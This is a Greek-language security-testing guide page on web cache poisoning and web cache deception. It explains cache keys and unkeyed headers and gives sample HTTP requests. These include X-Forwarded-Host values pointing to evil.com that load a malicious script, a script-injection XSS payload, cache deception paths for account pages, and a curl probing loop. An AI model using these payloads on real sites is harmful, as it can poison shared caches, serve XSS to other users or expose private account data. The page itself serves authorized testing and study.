# 💾 Web Cache Poisoning — Αλλοίωση αποθηκευμένων αποκρίσεων

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
<a href="../README.md">🇬🇧 English</a> • <a href="README.it.md">🇮🇹 Versione Italiana</a> • <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a>
</p>

```
   ██████╗ █████╗  ██████╗██╗  ██╗███████╗    ██████╗  ██████╗ ██╗███████╗ ██████╗ ███╗   ██╗██╗███╗   ██╗ ██████╗ 
  ██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝    ██╔══██╗██╔═══██╗██║██╔════╝██╔═══██╗████╗  ██║██║████╗  ██║██╔════╝ 
  ██║     ███████║██║     ███████║█████╗      ██████╔╝██║   ██║██║███████╗██║   ██║██╔██╗ ██║██║██╔██╗ ██║██║  ███╗
  ██║     ██╔══██║██║     ██╔══██║██╔══╝      ██╔═══╝ ██║   ██║██║╚════██║██║   ██║██║╚██╗██║██║██║╚██╗██║██║   ██║
  ╚██████╗██║  ██║╚██████╗██║  ██║███████╗    ██║     ╚██████╔╝██║███████║╚██████╔╝██║ ╚████║██║██║ ╚████║╚██████╔╝
   ╚═════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝    ╚═╝      ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

---

## Πριν ξεκινήσετε

Η **cache** είναι προσωρινή αποθήκη αποκρίσεων. Το **cache poisoning** εξετάζει αν μη έμπιστη είσοδος επηρεάζει απόκριση που αποθηκεύεται και δίνεται σε άλλους χρήστες. Το **cache deception** εξετάζει διαφορετικό πρόβλημα: αποθήκευση ιδιωτικών δεδομένων ως δημόσιου πόρου.

**Βασικοί όροι:** *cache key* = τα στοιχεία που προσδιορίζουν ποια αποθηκευμένη απόκριση θα επιστραφεί, *unkeyed input* = είσοδος που επηρεάζει την απόκριση χωρίς να διαφοροποιεί το κλειδί, *cache hit* = εξυπηρέτηση αποθηκευμένης απόκρισης, *cache buster* = τιμή που επιδιώκει να ξεχωρίσει τη δοκιμή από άλλες αποκρίσεις.

Η αντανάκλαση μιας κεφαλίδας και η ύπαρξη cache δεν αρκούν. Χρειάζεται ελεγχόμενη επιβεβαίωση ότι η επηρεασμένη απόκριση αποθηκεύεται και επιστρέφεται σε χωριστό, καθαρό αίτημα με το ίδιο σχετικό κλειδί.

## Περιεχόμενα

- [🎯 Τι είναι το cache poisoning](#section-01)
- [🔍 Κατανόηση της προσωρινής αποθήκευσης](#section-02)
- [💉 Έλεγχος κεφαλίδων εκτός κλειδιού cache](#section-03)
- [🔥 Τεχνικές ελέγχου](#section-04)
- [🛠️ Web Cache Deception — Παραπλάνηση προσωρινής αποθήκευσης](#section-05)
- [📊 Διαχωρισμός δοκιμών με cache buster](#section-06)
- [🛠️ Εργαλεία](#section-07)
- [📋 Υποψήφιες κεφαλίδες εκτός κλειδιού cache](#section-08)
- [📚 Πηγές](#section-09)

---

<a id="section-01"></a>

## 🎯 Τι είναι το cache poisoning

Το **Web Cache Poisoning** εκμεταλλεύεται τη συμπεριφορά προσωρινής αποθήκευσης ώστε μια επηρεασμένη απόκριση να αποθηκευτεί και να δοθεί σε άλλους χρήστες.

### Επίπτωση
- 🔴 **Διανομή XSS μέσω cache** — στους χρήστες που λαμβάνουν την επηρεασμένη απόκριση
- 🔴 **Αλλοίωση περιεχομένου** — αποθήκευση μη επιθυμητής απόκρισης
- 🔴 **Άρνηση υπηρεσίας** — αποθήκευση αποκρίσεων σφάλματος
- 🔴 **Ανακατευθύνσεις** — αποστολή χρηστών σε άλλο προορισμό

---

<a id="section-02"></a>

## 🔍 Κατανόηση της προσωρινής αποθήκευσης

> **Το κλειδί καθορίζεται από τη ρύθμιση:** Τα στοιχεία που ακολουθούν είναι παραδείγματα, όχι καθολικός κανόνας. Cache-Control, Age ή HIT είναι ενδείξεις που χρειάζονται συσχέτιση με συγκεκριμένο αίτημα και παραλλαγή απόκρισης. Δείτε την [μεθοδολογία cache poisoning της PortSwigger](https://portswigger.net/web-security/web-cache-poisoning).


### Κλειδιά προσωρινής αποθήκευσης
```
# Ενδεικτικά στοιχεία κλειδιού cache:
URL + κεφαλίδα Host, ανάλογα με τη ρύθμιση

# Πιθανές είσοδοι εκτός κλειδιού· εξαρτάται από τη ρύθμιση:
X-Forwarded-Host
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
Προσαρμοσμένες κεφαλίδες
```

### Αναγνώριση προσωρινής αποθήκευσης
```bash
# Αναζήτηση κεφαλίδων σχετικών με cache
curl -I https://target.com

# Ενδεικτικές κεφαλίδες cache:
X-Cache: HIT
X-Cache-Hits: 5
CF-Cache-Status: HIT
Age: 300
Cache-Control: public, max-age=3600
```

---

<a id="section-03"></a>

## 💉 Έλεγχος κεφαλίδων εκτός κλειδιού cache

### X-Forwarded-Host
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Αν η απόκριση περιλαμβάνει το evil.com:
<script src="//evil.com/malicious.js">
```

### X-Forwarded-Scheme
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Scheme: nothttps

# Ενδέχεται να προκαλέσει ανακατεύθυνση ή διαφορά ερμηνείας πρωτοκόλλου
Location: http://target.com/
```

### X-Host
```http
GET / HTTP/1.1
Host: target.com
X-Host: evil.com

# Έλεγχος αν η είσοδος εμφανίζεται στην απόκριση
```

### X-Original-URL / X-Rewrite-URL
```http
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin

# Εξέταση διαφορετικής εφαρμογής περιορισμών διαδρομής
```

---

<a id="section-04"></a>

## 🔥 Τεχνικές ελέγχου

### Βασικό παράδειγμα XSS μέσω cache
```http
# 1. Εύρεση εισόδου εκτός κλειδιού που εμφανίζεται στην απόκριση
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com"><script>alert(1)</script>

# 2. Ενδεχόμενη αποθήκευση της επηρεασμένης απόκρισης
# 3. Άλλοι χρήστες μπορεί να λάβουν την επηρεασμένη απόκριση cache
```

### Αλλοίωση cache μέσω διαδρομής
```http
# Αίτημα με διαφορετική γραφή διαδρομής
GET /page;evil HTTP/1.1
Host: target.com

# Ενδέχεται να χρησιμοποιηθεί διαφορετικό κλειδί από το αναμενόμενο
```

### Αιτήματα GET με σώμα δεδομένων

> **Μήκος σώματος:** Η τιμή Content-Length του δείγματος δεν αποτελεί ελεγμένη μέτρηση για αντιγραφή. Πρέπει να συμφωνεί με τα πραγματικά bytes που στέλνει ο client. Το αν ένα GET με σώμα γίνεται αποδεκτό ή αποθηκεύεται εξαρτάται από την υποδομή.

```http
GET / HTTP/1.1
Host: target.com
Content-Length: 25

callback=alert(document.domain)

# Το σώμα μπορεί να επηρεάζει την απόκριση χωρίς να συμμετέχει στο κλειδί cache
```

### Διαφορετική ερμηνεία παραμέτρων
```http
# Ruby on Rails
GET /page?param=value;callback=evil HTTP/1.1

# Διαφορετική ερμηνεία από cache και εφαρμογή
```

---

<a id="section-05"></a>

## 🛠️ Web Cache Deception — Παραπλάνηση προσωρινής αποθήκευσης

### Διαφορά από το cache poisoning
```
# Poisoning: επηρεασμένη απόκριση αποθηκεύεται και δίνεται σε άλλους χρήστες
# Deception: δεδομένα χρήστη αποθηκεύονται και γίνονται προσβάσιμα σε άλλον

# Ενδεικτική ακολουθία Web Cache Deception:
1. Σενάριο επίσκεψης χρήστη στο /account/settings.css
2. Ο server επιστρέφει /account/settings, αγνοώντας το .css
3. Η cache το αποθηκεύει ως δημόσιο πόρο
4. Άλλος χρήστης ζητά /account/settings.css από την cache
5. Ενδεχόμενη αποκάλυψη δεδομένων του αρχικού χρήστη
```

### Δοκιμαστικές είσοδοι (Payloads)
```
/account/settings/x.css
/account/settings/..%2fx.css
/account/settings%3b.css
/account/settings.css
/account/settings/nonexistent.js
```

---

<a id="section-06"></a>

## 📊 Διαχωρισμός δοκιμών με cache buster

> **Πρώτα επαληθεύστε το κλειδί:** Μια τυχαία παράμετρος δεν απομονώνει τη δοκιμή αν η cache την αγνοεί. Μην υποθέτετε ότι το cb δημιουργεί διαφορετικό κλειδί. Επιβεβαιώστε τον διαχωρισμό πριν δοκιμάσετε αλλαγές σε απόκριση που μπορεί να λαμβάνουν άλλοι χρήστες.


### Χρήση στις δοκιμές
```http
# Προσθήκη τιμής διαχωρισμού· πρώτα επιβεβαιώστε ότι συμμετέχει στο κλειδί cache
GET /page?cb=random123 HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Μοναδικό κλειδί ανά δοκιμή μόνο αν η τιμή λαμβάνεται πράγματι υπόψη
```

---

<a id="section-07"></a>

## 🛠️ Εργαλεία

### Param Miner — Πρόσθετο του Burp
```
1. Εγκαταστήστε Param Miner από το BApp Store
2. Δεξί κλικ στο αίτημα → Extensions → Param Miner
3. Επιλέξτε "Guess headers"
4. Εξετάστε ποιες κεφαλίδες δεν συμμετέχουν στο κλειδί cache
```

### Χειροκίνητοι έλεγχοι
```bash
# Έλεγχος κεφαλίδων
for header in "X-Forwarded-Host" "X-Host" "X-Forwarded-Scheme" "X-Original-URL"; do
    echo "Testing: $header"
    curl -H "$header: evil.com" -I https://target.com
done
```

---

<a id="section-08"></a>

## 📋 Υποψήφιες κεφαλίδες εκτός κλειδιού cache

```
X-Forwarded-Host
X-Forwarded-Scheme
X-Forwarded-Proto
X-Host
X-Original-URL
X-Rewrite-URL
X-Forwarded-Server
X-HTTP-Method-Override
X-Forwarded-For
True-Client-IP
```

---

<a id="section-09"></a>

## 📚 Πηγές

- [Οδηγός cache poisoning της PortSwigger](https://portswigger.net/web-security/web-cache-poisoning)
- [Έρευνα της PortSwigger](https://portswigger.net/research/practical-web-cache-poisoning)
- [Web Cache Deception — Παραπλάνηση προσωρινής αποθήκευσης](https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack.pdf)

---

<p align="center">
  <b>💾 Εξετάστε τη συμπεριφορά της cache!</b><br>
  <i>Μόνο για εξουσιοδοτημένους ελέγχους.</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
